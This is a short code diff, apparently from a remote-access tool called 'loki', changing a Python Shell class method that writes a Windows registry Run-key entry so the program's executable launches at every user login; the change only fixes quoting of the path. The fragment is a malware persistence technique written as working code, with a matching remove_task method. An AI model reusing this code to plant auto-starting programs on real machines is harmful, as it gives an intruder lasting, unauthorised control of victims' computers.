@@ -136,7 +136,7 @@ class Shell(object):
  def create_task(self, args):
   if hasattr(sys, 'frozen'):
    _path = sys.executable
-   cmd = r'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v loki /f /d \"{}\"'.format(_path)
+   cmd = r'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v loki /f /d "\"{}\""'.format(_path)
    subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
  def remove_task(self, args):
